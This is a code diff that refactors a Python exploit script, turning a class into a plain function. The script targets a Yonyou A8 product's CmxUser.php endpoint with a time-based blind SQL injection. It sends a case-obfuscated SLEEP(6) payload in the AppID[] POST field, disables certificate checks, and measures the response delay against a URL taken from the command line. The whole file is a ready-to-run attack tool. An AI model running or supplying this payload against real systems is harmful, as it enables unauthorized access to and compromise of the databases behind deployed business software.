@@ -11,14 +11,7 @@ import json
 import time
 import requests
 import warnings
-  
-  
-
-class a8_CmxUser_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['用友优普a8 CmxUserSQL时间盲注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -28,7 +21,7 @@ class a8_CmxUser_sqli:
             "AppID[]":"0 AnD(SeLeCt*FrOm(SeLeCt(SlEeP(6)))PyGh)"
         }
         payload = "/Server/CmxUser.php?pgid=AddUser_Step4"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         start_time = time.time()
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
@@ -44,5 +37,5 @@ class a8_CmxUser_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = a8_CmxUser_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
